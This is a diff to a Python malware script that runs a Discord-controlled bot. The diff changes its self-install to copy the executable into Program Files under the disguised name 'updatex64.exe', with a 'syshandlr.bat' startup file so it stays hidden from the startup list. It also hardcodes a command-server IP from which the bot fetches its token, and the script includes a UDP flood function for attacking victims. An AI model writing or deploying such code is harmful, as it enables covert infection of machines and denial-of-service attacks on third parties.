@@ -18,8 +18,8 @@ def runatstartup():
     else:
         user = os.getlogin()#Get the currently logged in user
         startupdir = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % (user) #Get the current user's startup directory
-        selffile = sys.argv[0] #Get the name of the currently running exe
-        exedirec = r'C:\Windows\en-US'#directory to write the exe to 
+        selffile = 'updatex64.exe' #Name to save the exe as. 
+        exedirec = r'C:\Program Files'#directory to write the exe to 
         startupbatdir = startupdir + '\syshandlr.bat'# name of the .bat file that will show up in the startup folder
         try:
             shutil.copy(selffile, exedirec)#Copy the exe to the exe directory
@@ -59,7 +59,7 @@ def flood(victim, vport, duration):#The flooding protocol. Note that this has no
             pass
         clienta.sendto(bytes, (victim, vport))
 runatstartup()#Copy the running exe to C:\Windows\en-US and create a .bat file in Programs\Startup that will run the exe, this way the exe does not show up in the startup list.
-webserverip = ''#change to your webserver IP only. No domain names etc
+webserverip = '207.244.237.196'#change to your webserver IP only. No domain names etc
 token = requests.get('http://' + webserverip + '/token.html').text#Get the token from your webserver/token.html
 bot = commands.Bot(command_prefix='/')#Initialize the discord bot
 @bot.event  
